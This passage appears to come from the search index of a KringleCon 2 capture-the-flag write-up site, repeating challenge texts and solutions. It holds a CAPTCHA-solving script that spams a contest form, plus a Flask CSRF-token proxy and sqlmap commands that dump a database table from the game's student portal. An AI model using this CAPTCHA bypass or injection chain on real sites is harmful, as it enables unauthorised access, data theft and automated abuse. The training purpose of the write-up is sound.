[] # What are we looking for? print(f'Looking for {types}') # Get the matching images for prediction in prediction_results: if prediction['prediction'] in types: print(f\"{prediction['img_uuid']} is a {prediction['prediction']}.\") answers.append(prediction['img_uuid']) final_answer = ','.join(answers) The remainder of Krampus' capteha_api.py script submits the list of UUIDs and, if successful, sends the Frido Sleigh form over and over again until a response is returned informing us we won. Be sure to replace yourREALemailAddress with a working email address though as the system needs to be able to send out a confirmation email. Answer # Email code: 8Ia8LiZEwvyZr2WO Hint # You did it! Thank you so much. I can trust you! To help you, I have flashed the firmware in your badge to unlock a useful new feature: magical teleportation through the steam tunnels. As for those scraps of paper, I scanned those and put the images on my server. I then threw the paper away. Unfortunately, I managed to lock out my account on the server. Hey! You\u2019ve got some great skills. Would you please hack into my system and retrieve the scans? I give you permission to hack into it, solving Objective 9 in your badge. And, as long as you're traveling around, be sure to solve any other challenges you happen across.","title":"Bypassing the Frido Sleigh CAPTEHA"},{"location":"challenges/c8/#bypassing-the-frido-sleigh-capteha","text":"Hint : Alabaster Snowball - Nyanshell","title":"Bypassing the Frido Sleigh CAPTEHA"},{"location":"challenges/c8/#request","text":"Help Krampus beat the Frido Sleigh contest . For hints on achieving this objective, please talk > with Alabaster Snowball in the Speaker Unpreparedness Room. Krampus: The contest is here on my screen and at fridosleigh.com . No purchase necessary, enter as often as you want, so I am! They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs. Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA. (That's Completely Automated Public Turing test to tell Elves and Humans Apart.) I've already cataloged 12,000 images and decoded the API interface . Can you help me bypass the CAPTEHA and submit lots of entries?","title":"Request"},{"location":"challenges/c8/#resources","text":"fridosleigh.com Image Training Data CAPTEHA API interface TensorFlow Machine Learning Demo Code Chris Davis, Machine Learning Use Cases for Cybersecurity","title":"Resources"},{"location":"challenges/c8/#solution","text":"Buckle up as we just reached the difficulty 4 and 5 challenges. Free Frido Sleigh cookies for life sounds like a pretty sweet deal, except for one minor issue. The form contains one of those super annoying CAPTEHA tests. \"A \u201cCAPTEHA\u201d is a Turing test to tell elves and humans apart. It is easy for an elf to solve because elves are magical creatures that work on holiday related objects year-round and can spot and click hundreds of holiday items per second. However, non-elves (like humans) will find it nearly impossible to visualize, correctly identify and click holiday items fast enough before the time runs out.\" In order to get around this we need a script that grabs the CAPTEHA data from fridosleigh.com , loops over all 100 images, selects the correct types, submits the final selection, and finally spams the hell out of the Frido Sleigh contest form. Luckily, all of the steps required, except for the image prediction portion, are already handled by the capteha_api.py script we receive from Krampus. For the image processing and prediction step, download and unpack the 12,000 images and clone or download the TensorFlow Machine Learning Demo Github repository. Follow the demo instructions to install the required Python packages. git clone https://github.com/chrisjd20/img_rec_tf_ml_demo.git cd img_rec_tf_ml_demo sudo apt install python3 python3-pip -y sudo python3 -m pip install --upgrade pip sudo python3 -m pip install --upgrade setuptools sudo python3 -m pip install --upgrade tensorflow==1.15 sudo python3 -m pip install tensorflow_hub Next, train the TensorFlow Machine Learning model by running the retrain.py script and providing the image folder as input. Depending on the hardware resources available this could create problems later on. On some hardware and with the default model it can take longer than 10 seconds to check each of the 100 images and fail the test as a result. The documentation at the top of the retrain.py script provides a possible solution though. \"By default this script will use the highly accurate, but comparatively large and slow Inception V3 model architecture. It's recommended that you start with this to validate that you have gathered good training data, but if you want to deploy on resource-limited platforms, you can try the --tfhub_module flag with a Mobilenet model.\" The default 299 x 299 image resolution used in retrain.py far exceeds what we need for the smaller CAPTEHA image data. A Mobilenet model with a smaller image size (i.e. 128 x 128) is more than enough and will, as the retrain.py documentation describes, give us faster speeds. Train the TensorFlow Machine Learning model using the sample images provided by Krampus and the proper Mobilenet model (i.e. 100 neurons and 128 input image size) as input. python retrain.py --image_dir ./training_images --tfhub_module \\ https://tfhub.dev/google/imagenet/mobilenet_v1_100_128/quantops/feature_vector/3 Once training is complete grab all the functions and remaining code from the predict_images_using_trained_model.py demo script and add them to capteha_api.py . Be sure to update both the input_height and input_width parameters in the read_tensor_from_image_bytes function to match the value defined by the selected Mobilenet model as well. The final script can be found in the 'Scripts' section, but a few code snippets from the main function are highlighted below. Request a CAPTEHA, store the image data, and parse out the image types we need to select. url = \"https://fridosleigh.com/\" # Create session s = requests.Session() # Get CAPTEHA images and types r = s.post(f'{url}api/capteha/request') if (r.json()['request']): images = r.json()['images'] types = [x.strip() for x in r.json()['select_type'].split(',')] types[-1] = types[-1].replace('and ', '') Next, iterate over the images and for each image extract the UUID, convert the BASE64 image data to binary, and use both as input to process and predict the image. Wait for all processing to finish (i.e. the queue size matches the number of images) and create a list containing the final prediction results. # Can use queues and threading to spead up the processing q = queue.Queue() # Going to interate over each of our images. for image in images: img_uuid = image['uuid'] img_base64 = image['base64'] print('Processing Image {}'.format(img_uuid)) # We don't want to process too many images at once. 10 threads max while len(threading.enumerate()) > 10: time.sleep(0.0001) # Predict_image function is expecting png image bytes so we read # image as 'rb' to get a bytes object image_bytes = base64.b64decode(img_base64) threading.Thread( target=predict_image, args=( q, sess, graph, image_bytes, img_uuid, labels, input_operation, output_operation ) ).start() print('Waiting For Threads to Finish...') while q.qsize() < len(images): time.sleep(0.001) # Getting a list of all threads returned results prediction_results = [q.get() for x in range(q.qsize())] Loop over the prediction results and, if an image matches a requested type, add its UUID to the answers list. answers = [] # What are we looking for? print(f'Looking for {types}') # Get the matching images for prediction in prediction_results: if prediction['prediction'] in types: print(f\"{prediction['img_uuid']} is a {prediction['prediction']}.\") answers.append(prediction['img_uuid']) final_answer = ','.join(answers) The remainder of Krampus' capteha_api.py script submits the list of UUIDs and, if successful, sends the Frido Sleigh form over and over again until a response is returned informing us we won. Be sure to replace yourREALemailAddress with a working email address though as the system needs to be able to send out a confirmation email.","title":"Solution"},{"location":"challenges/c8/#answer","text":"Email code: 8Ia8LiZEwvyZr2WO","title":"Answer"},{"location":"challenges/c8/#hint","text":"You did it! Thank you so much. I can trust you! To help you, I have flashed the firmware in your badge to unlock a useful new feature: magical teleportation through the steam tunnels. As for those scraps of paper, I scanned those and put the images on my server. I then threw the paper away. Unfortunately, I managed to lock out my account on the server. Hey! You\u2019ve got some great skills. Would you please hack into my system and retrieve the scans? I give you permission to hack into it, solving Objective 9 in your badge. And, as long as you're traveling around, be sure to solve any other challenges you happen across.","title":"Hint"},{"location":"challenges/c9/","text":"Retrieve the Scraps of Paper from Server # Hint : Pepper Minstix - Graylog Request # Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix. Krampus: Unfortunately, I managed to lock out my account on the server. Hey! You\u2019ve got some great skills. Would you please hack into my system and retrieve the scans? I give you permission to hack into it, solving Objective 9 in your badge. And, as long as you're traveling around, be sure to solve any other challenges you happen across. Resources # Student Portal OWASP SQL Injection SQLMAP Tamper Scripts for The Win Solution # Pepper hints at using blind SQLi to retrieve the scraps from the server but whipping out sqlmap won't do us much good at this point. Both the apply.php and check.php pages contain a set of custom JavaScript functions that first retrieve a token value from validator.php . This value is then added to the form data and submitted to the server as a way to prevent Cross-site request forgery (CSRF). For each request the server will first check the token and only accept the request if the token is valid. In other words, unless we tell sqlmap to submit a valid token with each of its requests, chances are the SQLi attempts won't even hit the backend database. Fortunately for us sqlmap has a --csrf-url option which allows you to specify a URL from where to retrieve tokens. Unfortunately for us, sqlmap also requires specifying the token field name via the --csrf-token option and validator.php doesn't set any token field names. It just returns the token value as-is. sqlmap -u \"https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&token=y\" \\ --csrf-url https://studentportal.elfu.org/validator.php --csrf-token= The problem can be solved by translating the validator.php response data to a format that sqlmap accepts (i.e. contains a token field name in the header or response body). When the below Flask proxy script script receives a GET request it grabs a token value from validator.php and adds it as the value to a token field in both the header and body of its own HTTP response. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Retrieve Scraps of Paper from Server Challenge.\"\"\" import requests from flask import Flask, Response app = Flask(__name__) @app.route(\"/\") def token(): \"\"\"Return a token.\"\"\" url = 'https://studentportal.elfu.org/validator.php' token = requests.Session().get(url).text # Put the token in the body, input tag, and header. resp = Response( f'Token:{token}\\n' '<form>\\n' f' <input type=\"hidden\" id=\"token\" name=\"token\" value=\"{token}\"/>\\n' '</form>\\n' ) resp.headers['token'] = token return resp if __name__ == '__main__': app.run(host='0.0.0.0') Start the Flask proxy app so it's ready to respond to incoming token requests. python3 token_proxy.py Now run the earlier sqlmap command again but with the --csrf-url parameter set to our proxy listening on 127.0.0.1:5000 and --csrf-token set to 'token'. This will allow sqlmap to send valid HTTP requests to the server and execute its SQLi attacks. sqlmap -u \"https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&token=y\" \\ --csrf-url http://127.0.0.1:5000/ --csrf-token=token We now know the database type (i.e. MySQL) and that the setup is vulnerable to at least three types of SQL Injection attacks via the elfmail GET parameter: boolean-based blind, error-based, and time-based blind. Grab an overview of the available databases. sqlmap -u \"https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&token=y\" \\ --csrf-url http://127.0.0.1:5000/ --csrf-token=token --dbms=mysql --dbs information_schema is a default MySQL database so request the tables for elfu . sqlmap -u \"https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&token=y\" \\ --csrf-url http://127.0.0.1:5000/ --csrf-token=token --dbms=mysql --tables -D elfu Out of the three tables in the elfu database krampus looks like a good candidate so let's dump that. sqlmap -u \"https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&token=y\" \\ --csrf-url http://127.0.0.1:5000/ --csrf-token=token --dbms=mysql -D elfu -T krampus --dump Well that looks pretty promising. Download the PNG files from the Student Portal and reassemble them using an image editor. Answer # Sleigh guidance system name: Super Sled-o-matic Hint # Wow! We\u2019ve uncovered quite a nasty plot to destroy the holiday season. We\u2019ve gotta stop whomever is behind it! I managed to find this protected document on one of the compromised machines in our environment. I think our attacker was in the process of exfiltrating it. I\u2019m convinced that it is somehow associated with the plan to destroy the holidays. Can you decrypt it? There are some smart people in the NetWars challenge room who may be able to help us.","title":"Retrieve the Scraps of Paper from Server"},{"location":"challenges/c9/#retrieve-the-scraps-of-paper-from-server","text":"Hint : Pepper Minstix - Graylog","title":"Retrieve the Scraps of Paper from Server"},{"location":"challenges/c9/#request","text":"Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix. Krampus: Unfortunately, I managed to lock out my account on the server. Hey! You\u2019ve got some great skills. Would you please hack into my system and retrieve the scans? I give you permission to hack into it, solving Objective 9 in your badge. And, as long as you're traveling around, be sure to solve any other challenges you happen across.","title":"Request"},{"location":"challenges/c9/#resources","text":"Student Portal OWASP SQL Injection SQLMAP Tamper Scripts for The Win","title":"Resources"},{"location":"challenges/c9/#solution","text":"Pepper hints at using blind SQLi to retrieve the scraps from the server but whipping out sqlmap won't do us much good at this point. Both the apply.php and check.php pages contain a set of custom JavaScript functions that first retrieve a token value from validator.php . This value is then added to the form data and submitted to the server as a way to prevent Cross-site request forgery (CSRF). For each request the server will first check the token and only accept the request if the token is valid. In other words, unless we tell sqlmap to submit a valid token with each of its requests, chances are the SQLi attempts won't even hit the backend database. Fortunately for us sqlmap has a --csrf-url option which allows you to specify a URL from where to retrieve tokens. Unfortunately for us, sqlmap also requires specifying the token field name via the --csrf-token option and validator.php doesn't set any token field names. It just returns the token value as-is. sqlmap -u \"https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&token=y\" \\ --csrf-url https://studentportal.elfu.org/validator.php --csrf-token= The problem can be solved by translating the validator.php response data to a format that sqlmap accepts (i.e. contains a token field name in the header or response body). When the below Flask proxy script script receives a GET request it grabs a token value from validator.php and adds it as the value to a token field in both the header and body of its own HTTP response. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Retrieve Scraps of Paper from Server Challenge.\"\"\" import requests from flask import Flask, Response app = Flask(__name__) @app.route(\"/\") def token(): \"\"\"Return a token.\"\"\" url = 'https://studentportal.elfu.org/validator.php' token = requests.Session().get(url).text # Put the token in the body, input tag, and header. resp = Response( f'Token:{token}\\n' '<form>\\n' f' <input type=\"hidden\" id=\"token\" name=\"token\" value=\"{token}\"/>\\n' '</form>\\n' ) resp.headers['token'] = token return resp if __name__ == '__main__': app.run(host='0.0.0.0') Start the Flask proxy app so it's ready to respond to incoming token requests. python3 token_proxy.py Now run the earlier sqlmap command again but with the --csrf-url parameter set to our proxy listening on 127.0.0.1:5000 and --csrf-token set to 'token'. This will allow sqlmap to send valid HTTP requests to the server and execute its SQLi attacks. sqlmap -u \"https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&token=y\" \\ --csrf-url http://127.0.0.1:5000/ --csrf-token=token We now know the database type (i.e. MySQL) and that the setup is vulnerable to at least three types of SQL Injection attacks via the elfmail GET parameter: boolean-based blind, error-based, and time-based blind. Grab an overview of the available databases. sqlmap -u \"https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&token=y\" \\ --csrf-url http://127.0.0.1:5000/ --csrf-token=token --dbms=mysql --dbs information_schema is a default MySQL database so request the tables for elfu . sqlmap -u \"https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&token=y\" \\ --csrf-url http://127.0.0.1:5000/ --csrf-token=token --dbms=mysql --tables -D elfu Out of the three tables in the elfu database krampus looks like a good candidate so let's dump that. sqlmap -u \"https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&token=y\" \\ --csrf-url http://127.0.0.1:5000/ --csrf-token=token --dbms=mysql -D elfu -T krampus --dump Well that looks pretty promising. Download the PNG files from the Student Portal and reassemble them using an image editor.","title":"Solution"},{"location":"challenges/c9/#answer","text":"Sleigh guidance system name: Super Sled-o-matic","title":"Answer"},{"location":"challenges/c9/#hint","text":"Wow! We\u2019ve uncovered quite a nasty plot to destroy the holiday season. We\u2019ve gotta stop whomever is behind it! I managed to find this protected document on one of the compromised machines in our environment. I think our attacker was in the process of exfiltrating it. I\u2019m convinced that it is somehow associated with the plan to destroy the holidays. Can you decrypt it? There are some smart people in the NetWars challenge room who may be able to help us.","title":"Hint"},{"location":"hints/h10/","text":"Holly Evergreen - Mongo Pilfer # Challenge : Recover Cleartext Document Request # Hey! It's me, Holly Evergreen! My teacher has been locked out of the quiz database and can't remember the right solution. Without access to the answer, none of our quizzes will get graded. Can we help get back in to find that solution? I tried lsof -i, but that tool doesn't seem to be installed. I think there's a tool like ps that'll help too. What are the flags I need? Either way, you'll need to know a teensy bit of Mongo once you're in. Pretty please find us the solution to the quiz! Resources # MongoDB Documentation Solution # First determine the port that MongoDB is listening on by executing ps ax . Next, connect to MongoDB using mongo 127.0.0.1:12121 --quiet and list all databases with show databases . Open the 'elfu' database with use elfu and show the available collections by issuing the command show collections . The 'solution' collection seems a likely candidate to contain quiz answers. Use db.solution.find() to list its documents. Now run db.loadServerScripts();displaySolution(); as instructed. Answer # See solution . Hint # Woohoo! Fantabulous! I'll be the coolest elf in class. On a completely unrelated note, digital rights management can bring a hacking elf down. That ElfScrow one can really be a hassle. It's a good thing Ron Bowes is giving a talk on reverse engineering ! That guy knows how to rip a thing apart. It's like he breathes opcodes!","title":"Holly Evergreen - Mongo Pilfer"},{"location":"hints/h10/#holly-evergreen-mongo-pilfer","text":"Challenge : Recover Cleartext Document","title":"Holly Evergreen - Mongo Pilfer"},{"location":"hints/h10/#request","text":"Hey! It's me, Holly Evergreen! My teacher has been locked out of the quiz database and can't remember the right solution. Without access to the answer, none of our quizzes will get graded. Can we help get back in to find that solution? I tried lsof -i, but that tool doesn't seem to be installed. I think there's a tool like ps that'll help too. What are the flags I need? Either way, you'll need to know a teensy bit of Mongo once you're in. Pretty please find us the solution to the quiz!","title":"Request"},{"location":"hints/h10/#resources","text":"MongoDB Documentation","title":"Resources"},{"location":"hints/h10/#solution","text":"First determine the port that MongoDB is listening on by executing ps ax . Next, connect to MongoDB using mongo 127.0.0.1:12121 --quiet and list all databases with show databases . Open the 'elfu' database with use elfu and show the available collections by issuing the command show collections . The 'solution' collection seems a likely candidate to contain quiz answers. Use db.solution.find() to list its documents. Now run db.loadServerScripts();displaySolution(); as instructed.","title":"Solution"},{"location":"hints/h10/#answer","text":"See solution .","title":"Answer"},{"location":"hints/h10/#hint","text":"Woohoo! Fantabulous! I'll be the coolest elf in class. On a completely unrelated note, digital rights management can bring a hacking elf down. That ElfScrow one can really be a hassle. It's a good thing Ron Bowes is giving a talk on reverse engineering ! That guy knows how to rip a thing apart. It's like he breathes opcodes!","title":"Hint"},{"location":"hints/h11/","text":"Kent Tinseltooth - Smart Braces # Challenge : Open the Sleigh Shop Door Request # OK, this is starting to freak me out! Oh sorry, I'm Kent Tinseltooth. My Smart Braces are acting up. Do... Do you ever get the feeling you can hear things? Like, voices? I know, I sound crazy, but ever since I got these... Oh! Do you think you could take a look at my Smart Braces terminal? I'll bet you can keep other students out of my head, so to speak. It might just take a bit of Iptables work. Resources # How to configure iptables on CentOS Solution # The challenge starts off with a conversation between Kent and a mysterious voice his head. It doesn't provide any real tips or hints except maybe for a little bit of context and a mention of the srf.elfu.org domain which we'll be using in challenge 12 . /home/elfuuser/IOTteethBraces.md contains the firewall configuration for the Smart Braces: Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22). Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface. Set up the following iptables rules to match the required configuration: sudo iptables -P INPUT DROP sudo iptables -P FORWARD DROP sudo iptables -P OUTPUT DROP sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT sudo iptables -A INPUT -s 172.19.0.225 -p tcp --dport 22 -j ACCEPT sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT sudo iptables -A INPUT -i lo -j ACCEPT That's it! Firewall rules applied and inner peace for Kent achieved! Answer # See solution . Hint # Oh thank you! It's so nice to be back in my own head again. Er, alone. By the way, have you tried to get into the crate in the Student Union? It has an interesting set of locks. There are funny rhymes, references to perspective, and odd mentions of eggs! And if you think the stuff in your browser looks strange, you should see the page source... Special tools? No, I don't think you'll need any extra tooling for those locks. BUT - I'm pretty sure you'll need to use Chrome's developer tools for that one. Or sorry, you're a Firefox fan ? Yeah, Safari's fine too - I just have an ineffible hunger for a physical Esc key. Edge ? That's cool. Hm? No no, I was thinking of an unrelated thing. Curl fan ? Right on! Just remember: the Windows one doesn't like double quotes. Old school, huh? Oh sure - I've got what you need right here ... And I hear the Holiday Hack Trail game will give hints on the last screen if you complete it on Hard.","title":"Kent Tinseltooth - Smart Braces"},{"location":"hints/h11/#kent-tinseltooth-smart-braces","text":"Challenge : Open the Sleigh Shop Door","title":"Kent Tinseltooth - Smart Braces"},{"location":"hints/h11/#request","text":"OK, this is starting to freak me out! Oh sorry, I'm Kent Tinseltooth. My Smart Braces are acting up. Do... Do you ever get the feeling you can hear things? Like, voices? I know, I sound crazy, but ever since I got these... Oh! Do you think you could take a look at my Smart Braces terminal? I'll bet you can keep other students out of my head, so to speak. It might just take a bit of Iptables work.","title":"Request"},{"location":"hints/h11/#resources","text":"How to configure iptables on CentOS","title":"Resources"},{"location":"hints/h11/#solution","text":"The challenge starts off with a conversation between Kent and a mysterious voice his head. It doesn't provide any real tips or hints except maybe for a little bit of context and a mention of the srf.elfu.org domain which we'll be using in challenge 12 . /home/elfuuser/IOTteethBraces.md contains the firewall configuration for the Smart Braces: Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22). Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface. Set up the following iptables rules to match the required configuration: sudo iptables -P INPUT DROP sudo iptables -P FORWARD DROP sudo iptables -P OUTPUT DROP sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT sudo iptables -A INPUT -s 172.19.0.225 -p tcp --dport 22 -j ACCEPT sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT sudo iptables -A INPUT -i lo -j ACCEPT That's it! Firewall rules applied and inner peace for Kent achieved!","title":"Solution"},{"location":"hints/h11/#answer","text":"See solution .","title":"Answer"},{"location":"hints/h11/#hint","text":"Oh thank you! It's so nice to be back in my own head again. Er, alone. By the way, have you tried to get into the crate in the Student Union? It has an interesting set of locks. There are funny rhymes, references to perspective, and odd mentions of eggs! And if you think the stuff in your browser looks strange, you should see the page source... Special tools? No, I don't think you'll need any extra tooling for those locks. BUT - I'm pretty sure you'll need to use Chrome's developer tools for that one. Or sorry, you're a Firefox fan ? Yeah, Safari's fine too - I just have an ineffible hunger for a physical Esc key. Edge ? That's cool. Hm? No no, I was thinking of an unrelated thing. Curl fan ? Right on! Just remember: the Windows one doesn't like double quotes. Old school, huh? Oh sure - I've got what you need right here ... And I hear the Holiday Hack Trail game will give hints on the last screen if you complete it on Hard.","title":"Hint"},{"location":"hints/h12/","text":"Wunorse Openslae - Zeek JSON Analysis # Challenge : Filter Out Poisoned Data Sources Request # Wunorse Openslae here, just looking at some Zeek logs. I'm pretty sure one of these connections is a malicious C2 channel... Do you think you could take a look? I hear a lot of C2 channels have very long connection times. Please use jq to find the longest connection in this data set. We have to kick out any and all grinchy activity! Resources # Parsing Zeek JSON Logs with JQ Solution # Start by displaying a single log entry and its properties using cat conn.log | jq -s '.[0]' . Looks like the duration field contains the information we need. Execute cat conn.log | jq -s 'sort_by(.duration) | reverse | .[0]' to reverse sort by duration and show the log entry matching the longest connection time. The destination IP address with the longest connection duration is 13.107.21.200 . Answer # IP address: 13.107.21.200 Hint # That's got to be the one - thanks! Hey, you know what? We've got a crisis here. You see, Santa's flight route is planned by a complex set of machine learning algorithms which use available weather data. All the weather stations are reporting severe weather to Santa's Sleigh. I think someone might be forging intentionally false weather data! I'm so flummoxed I can't even remember how to login! Hmm... Maybe the Zeek http.log could help us. I worry about LFI , XSS , and SQLi in the Zeek log - oh my! And I'd be shocked if there weren't some shell stuff in there too. I'll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall. If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs. The sleigh's machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route. Try not to block many legitimate weather station IPs as that could also cause route calculation failure. Remember, when looking at JSON data, jq is the tool for you!","title":"Wunorse Openslae - Zeek JSON Analysis"},{"location":"hints/h12/#wunorse-openslae-zeek-json-analysis","text":"Challenge : Filter Out Poisoned Data Sources","title":"Wunorse Openslae - Zeek JSON Analysis"},{"location":"hints/h12/#request","text":"Wunorse Openslae here, just looking at some Zeek logs. I'm pretty sure one of these connections is a malicious C2 channel... Do you think you could take a look? I hear a lot of C2 channels have very long connection times. Please use jq to find the longest connection in this data set. We have to kick out any and all grinchy activity!","title":"Request"},{"location":"hints/h12/#resources","text":"Parsing Zeek JSON Logs with JQ","title":"Resources"},{"location":"hints/h12/#solution","text":"Start by displaying a single log entry and its properties using cat conn.log | jq -s '.[0]' . Looks like the duration field contains the information we need. Execute cat conn.log | jq -s 'sort_by(.duration) | reverse | .[0]' to reverse sort by duration and show the log entry matching the longest connection time. The destination IP address with the longest connection duration is 13.107.21.200 .","title":"Solution"},{"location":"hints/h12/#answer","text":"IP address: 13.107.21.200","title":"Answer"},{"location":"hints/h12/#hint","text":"That's got to be the one - thanks! Hey, you know what? We've got a crisis here. You see, Santa's flight route is planned by a complex set of machine learning algorithms which use available weather data. All the weather stations are reporting severe weather to Santa's Sleigh. I think someone might be forging intentionally false weather data! I'm so flummoxed I can't even remember how to login! Hmm... Maybe the Zeek http.log could help us. I worry about LFI , XSS , and SQLi in the Zeek log - oh my! And I'd be shocked if there weren't some shell stuff in there too. I'll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall. If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs. The sleigh's machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route. Try not to block many legitimate weather station IPs as that could also cause route calculation failure. Remember, when looking at JSON data, jq is the tool for you!","title":"Hint"},{"location":"hints/h3/","text":"Bushy Evergreen - Escape Ed # Challenge : Evaluate Attack Outcome Request # Hi, I'm Bushy Evergreen. Welcome to Elf U! I'm glad you're here. I'm the target of a terrible trick. Pepper Minstix is at it again, sticking me in a text editor. Pepper is forcing me to learn ed. Even the hint is ugly. Why can't I just use Gedit? Please help me just quit the grinchy thing. Resources # Ed Is The Standard Text Editor Solution # The Ed manual provides the answer on the first page. Simply type q and press <enter> to exit the editor. Answer # Type q and press <enter> . Hint # Wow, that was much easier than I'd thought. Maybe I don't need a clunky GUI after all! Have you taken a look at the password spray attack artifacts? I'll bet that DeepBlueCLI tool is helpful. You can check it out on GitHub. It was written by that Eric Conrad . He lives in Maine - not too far from here!","title":"Bushy Evergreen - Escape Ed"},{"location":"hints/h3/#bushy-evergreen-escape-ed","text":"Challenge : Evaluate Attack Outcome","title":"Bushy Evergreen - Escape Ed"},{"location":"hints/h3/#request","text":"Hi, I'm Bushy Evergreen. Welcome to Elf U! I'm glad you're here. I'm the target of a terrible trick. Pepper Minstix is at it again, sticking me in a text editor. Pepper is forcing me to learn ed. Even the hint is ugly. Why can't I just use Gedit? Please help me just quit the grinchy thing.","title":"Request"},{"location":"hints/h3/#resources","text":"Ed Is The Standard Text Editor","title":"Resources"},{"location":"hints/h3/#solution","text":"The Ed manual provides the answer on the first page. Simply type q and press <enter> to exit the editor.","title":"Solution"},{"location":"hints/h3/#answer","text":"Type q and press <enter> .","title":"Answer"},{"location":"hints/h3/#hint","text":"Wow, that was much easier than I'd thought. Maybe I don't need a clunky GUI after all! Have you taken a look at the password spray attack artifacts? I'll bet that DeepBlueCLI tool is helpful. You can check it out on GitHub. It was written by that Eric Conrad . He lives in Maine - not too far from here!","title":"Hint"},{"location":"hints/h4/","text":"SugarPlum Mary - Linux Path # Challenge : Determine Attacker Technique Request # Oh me oh my - I need some help! I need to review some files in my Linux terminal, but I can't get a file listing. I know the command is ls, but it's really acting up. Do you think you could help me out? As you work on this, think about these questions: 1. Do the words in green have special significance? 2. How can I find a file with a specific name? 3. What happens if there are multiple executables with the same name in my $PATH? Resources # \"Green words matter, files must be found, and the terminal's $PATH matters.\" Solution # When running a command without specifying the full path, the OS uses the list of paths stored in the $PATH environment variable to determine where the OS should look for executables. If multiple executables share the same name, the first binary that's found in the user's $PATH is the one that will be executed. Use which ls to show the binary that's executed by default Use find / -iname ls 2>/dev/null to search for any files matching the name 'ls' (and suppress errors). The wrong /usr/local/bin/ls binary appears to be taking precedence over /bin/ls . Simply run /bin/ls to solve the challenge. Answer # Execute /bin/ls . Hint # Oh me oh my - I need some help! Oh there they are! Now I can delete them. Thanks! Have you tried the Sysmon and EQL challenge? If you aren't familiar with Sysmon, Carlos Perez has some great info about it. Haven't heard of the Event Query Language? Check out some of Ross Wolf's work on EQL or that blog post by Josh Wright in your badge.","title":"SugarPlum Mary - Linux Path"},{"location":"hints/h4/#sugarplum-mary-linux-path","text":"Challenge : Determine Attacker Technique","title":"SugarPlum Mary - Linux Path"},{"location":"hints/h4/#request","text":"Oh me oh my - I need some help! I need to review some files in my Linux terminal, but I can't get a file listing. I know the command is ls, but it's really acting up. Do you think you could help me out? As you work on this, think about these questions: 1. Do the words in green have special significance? 2. How can I find a file with a specific name? 3. What happens if there are multiple executables with the same name in my $PATH?","title":"Request"},{"location":"hints/h4/#resources","text":"\"Green words matter, files must be found, and the terminal's $PATH matters.\"","title":"Resources"},{"location":"hints/h4/#solution","text":"When running a command without specifying the full path, the OS uses the list of paths stored in the $PATH environment variable to determine where the OS should look for executables. If multiple executables share the same name, the first binary that's found in the user's $PATH is the one that will be executed. Use which ls to show the binary that's executed by default Use find / -iname ls 2>/dev/null to search for any files matching the name 'ls' (and suppress errors). The wrong /usr/local/bin/ls binary appears to be taking precedence over /bin/ls . Simply run /bin/ls to solve the challenge.","title":"Solution"},{"location":"hints/h4/#answer","text":"Execute /bin/ls .","title":"Answer"},{"location":"hints/h4/#hint","text":"Oh me oh my - I need some help! Oh there they are! Now I can delete them. Thanks! Have you tried the Sysmon and EQL challenge? If you aren't familiar with Sysmon, Carlos Perez has some great info about it. Haven't heard of the Event Query Language? Check out some of Ross Wolf's work on EQL or that blog post by Josh Wright in your badge.","title":"Hint"},{"location":"hints/h5/","text":"Sparkle Redberry - Xmas Cheer Laser # Challenge : Determine Compromised System Request # I'm Sparkle Redberry and Imma chargin' my laser! Problem is: the settings are off. Do you know any PowerShell? It'd be GREAT if you could hop in and recalibrate this thing. It spreads holiday cheer across the Earth ... ... when it's working! Resources # SANS' PowerShell Cheat Sheet Solution # Before we go over the solution I'd like to direct everyone's attention to the way Sparkle's running this whole laser experiment. Is there really no other option than pointing insanely intense laser beams at a snowman? I mean, what if 